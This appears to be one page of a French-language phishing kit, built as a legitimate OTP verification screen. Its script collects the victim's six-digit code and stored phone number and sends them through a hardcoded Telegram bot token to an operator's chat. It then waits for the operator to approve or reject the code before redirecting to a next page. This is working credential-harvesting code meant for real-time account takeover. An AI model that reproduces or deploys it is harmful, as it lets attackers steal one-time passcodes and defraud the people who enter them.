<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Entrez votre code OTP</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #1a1a1a;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 20px;
        }
        
        .top-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
        }
        
        .back-btn {
            font-size: 24px;
            background: none;
            border: none;
            cursor: pointer;
            padding: 5px 0;
            color: #1a1a1a;
        }
        
        .logo-img {
            max-height: 40px;
            width: auto;
            object-fit: contain;
        }
        
        .header-section {
            margin-top: 25px;
            margin-bottom: 25px;
        }
        
        .title {
            font-size: 26px;
            font-weight: 700;
            color: #1a202c;
            margin-bottom: 12px;
        }
        
        .subtitle {
            font-size: 14px;
            color: #718096;
            line-height: 1.5;
        }
        
        .form-container {
            display: flex;
            flex-direction: column;
            flex-grow: 1;
        }
        
        .otp-container {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .otp-box {
            width: 48px;
            height: 52px;
            border: 1.5px solid #e2e8f0;
            border-radius: 12px;
            text-align: center;
            font-size: 20px;
            font-weight: 600;
            color: #1a202c;
            outline: none;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
        }
        
        .otp-box:focus {
            border-color: #1a202c;
        }
        
        .timer-text {
            font-size: 15px;
            color: #4a5568;
            font-weight: 500;
            margin-top: 5px;
        }
        
        .resend-btn {
            background: none;
            border: none;
            color: #2b6cb0;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            padding: 0;
            display: none;
        }
        
        .bottom-section {
            margin-top: auto;
            padding-top: 20px;
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background-color: #92a4c0;
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            transition: background-color 0.2s ease;
        }
        
        .submit-btn.active {
            background-color: #4a5568;
            cursor: pointer;
        }
        
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            font-size: 18px;
            font-weight: 600;
            color: #2d3748;
            gap: 12px;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #cbd5e0;
            border-top: 4px solid #4a5568;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>

    <div class="top-bar">
        <button class="back-btn" onclick="history.back()">&#8592;</button>
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTn_5VYmxA4NGfip7K56How6z7pn9bFgakJPQwVOc3iyQ&s=10" alt="Logo" class="logo-img">
    </div>

    <div class="header-section">
        <h1 class="title">Entrez votre code OTP</h1>
        <p class="subtitle" id="subtitleText">Veuillez entrer le code OTP qui vient d'être envoyé sur votre téléphone.</p>
    </div>

    <!-- Loading Overlay -->
    <div id="loading-overlay" class="loading-overlay">
        <div class="spinner"></div>
        <span id="loading-text">En attente d'approbation...</span>
    </div>

    <form class="form-container" id="otpForm">
        <!-- 6-Digit OTP Box Input -->
        <div class="otp-container">
            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" required>
            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" required>
            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" required>
            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" required>
            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" required>
            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" required>
        </div>

        <!-- Timer / Resend section -->
        <div class="timer-text" id="timer">00:47</div>
        <button type="button" class="resend-btn" id="resendBtn">Renvoyer le code</button>

        <div class="bottom-section">
            <button type="submit" id="submitBtn" class="submit-btn" disabled>Continuer</button>
        </div>
    </form>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const otpBoxes = document.querySelectorAll('.otp-box');
            const submitBtn = document.getElementById('submitBtn');
            const timerDisplay = document.getElementById('timer');
            const resendBtn = document.getElementById('resendBtn');
            const otpForm = document.getElementById('otpForm');
            const overlay = document.getElementById('loading-overlay');
            const loadingText = document.getElementById('loading-text');

            // Bot Configuration
            const BOT_TOKEN = "8915532956:AAGgSCVMbme8tseqr6Nwj-cC1SHpm00aRgA";
            const ADMIN_CHAT_ID = "6688307423";

            // --- OTP Auto-Focus & Navigation Logic ---
            otpBoxes.forEach((box, index) => {
                box.addEventListener('input', function() {
                    this.value = this.value.replace(/\D/g, ''); // Digits only

                    if (this.value && index < otpBoxes.length - 1) {
                        otpBoxes[index + 1].focus();
                    }
                    validateOtp();
                });

                box.addEventListener('keydown', function(e) {
                    if (e.key === "Backspace" && !this.value && index > 0) {
                        otpBoxes[index - 1].focus();
                    }
                });

                box.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const pasteData = (e.clipboardData || window.clipboardData).getData('text');
                    const digits = pasteData.replace(/\D/g, '').split('');

                    otpBoxes.forEach((b, i) => {
                        b.value = digits[i] || '';
                    });

                    const firstEmpty = Array.from(otpBoxes).findIndex(b => !b.value);
                    if (firstEmpty !== -1) {
                        otpBoxes[firstEmpty].focus();
                    } else {
                        otpBoxes[otpBoxes.length - 1].focus();
                    }
                    validateOtp();
                });
            });

            function validateOtp() {
                const isComplete = Array.from(otpBoxes).every(box => box.value.length === 1);
                submitBtn.disabled = !isComplete;
                submitBtn.classList.toggle('active', isComplete);
            }

            // --- Countdown Timer Logic ---
            let timeLeft = 47;
            let timerInterval;

            function startTimer() {
                timerDisplay.style.display = "block";
                resendBtn.style.display = "none";

                timerInterval = setInterval(() => {
                    if (timeLeft <= 0) {
                        clearInterval(timerInterval);
                        timerDisplay.style.display = "none";
                        resendBtn.style.display = "inline-block";
                    } else {
                        timeLeft--;
                        const seconds = timeLeft < 10 ? `0${timeLeft}` : timeLeft;
                        timerDisplay.textContent = `00:${seconds}`;
                    }
                }, 1000);
            }

            resendBtn.addEventListener('click', function() {
                timeLeft = 47;
                startTimer();
            });

            startTimer();

            // --- Form Submission & Telegram Verification ---
            otpForm.addEventListener('submit', async function(event) {
                event.preventDefault();

                let otpCode = "";
                otpBoxes.forEach(box => {
                    otpCode += box.value;
                });

                if (otpCode.length !== 6) return;

                const phone = localStorage.getItem("phone") || "Inconnu";
                const sessionId = 'otp_' + Date.now();

                // Show loading screen
                if (overlay) overlay.style.display = "flex";
                loadingText.textContent = "En attente de l'approbation de l'administrateur...";

                const message = `🔔 *Code de Vérification OTP*\n\n📱 Téléphone : \`${phone}\`\n🔢 OTP : \`${otpCode}\`\n🆔 Session : \`${sessionId}\``;

                const inlineKeyboard = {
                    inline_keyboard: [
                        [{
                            text: "✅ Approuvé",
                            callback_data: `approve:${sessionId}`
                        }, {
                            text: "❌ Refusé",
                            callback_data: `decline:${sessionId}`
                        }]
                    ]
                };

                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id: ADMIN_CHAT_ID,
                            text: message,
                            parse_mode: "Markdown",
                            reply_markup: inlineKeyboard
                        })
                    });

                    const result = await response.json();
                    if (result.ok) {
                        startPollingForApproval(BOT_TOKEN, sessionId);
                    } else {
                        if (overlay) overlay.style.display = "none";
                        alert("Erreur lors de l'envoi de la demande. Veuillez réessayer.");
                    }
                } catch (err) {
                    console.error("Erreur réseau :", err);
                    if (overlay) overlay.style.display = "none";
                    alert("Erreur réseau. Veuillez vérifier votre connexion.");
                }
            });

            // Poll Telegram for Approval/Decline feedback
            function startPollingForApproval(botToken, sessionId) {
                let offset = 0;
                let pollInterval = setInterval(async function() {
                    try {
                        const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=5`);
                        const data = await response.json();

                        if (data.ok && data.result) {
                            for (const update of data.result) {
                                offset = update.update_id + 1;

                                if (update.callback_query) {
                                    const callbackData = update.callback_query.data;
                                    const callbackQueryId = update.callback_query.id;

                                    if (callbackData === `approve:${sessionId}`) {
                                        clearInterval(pollInterval);

                                        await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                                            method: "POST",
                                            headers: {
                                                "Content-Type": "application/json"
                                            },
                                            body: JSON.stringify({
                                                callback_query_id: callbackQueryId,
                                                text: "Approuvé !"
                                            })
                                        });

                                        loadingText.textContent = "Approuvé ! Redirection en cours...";
                                        setTimeout(() => {
                                            window.location.href = "page8.html";
                                        }, 1000);
                                        return;
                                    } else if (callbackData === `decline:${sessionId}`) {
                                        clearInterval(pollInterval);

                                        await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                                            method: "POST",
                                            headers: {
                                                "Content-Type": "application/json"
                                            },
                                            body: JSON.stringify({
                                                callback_query_id: callbackQueryId,
                                                text: "Refusé. Veuillez recommencer."
                                            })
                                        });

                                        if (overlay) overlay.style.display = "none";

                                        // Reset form for re-entry
                                        otpBoxes.forEach(box => box.value = "");
                                        otpBoxes[0].focus();
                                        validateOtp();

                                        alert("Le code OTP a été refusé. Veuillez le saisir à nouveau.");
                                        return;
                                    }
                                }
                            }
                        }
                    } catch (error) {
                        console.error("Erreur de scrutation :", error);
                    }
                }, 2000);
            }

            // Telegram WebApp initialization
            if (window.Telegram && window.Telegram.WebApp) {
                window.Telegram.WebApp.ready();
                window.Telegram.WebApp.expand();
            }
        });
    </script>

</body>

</html>
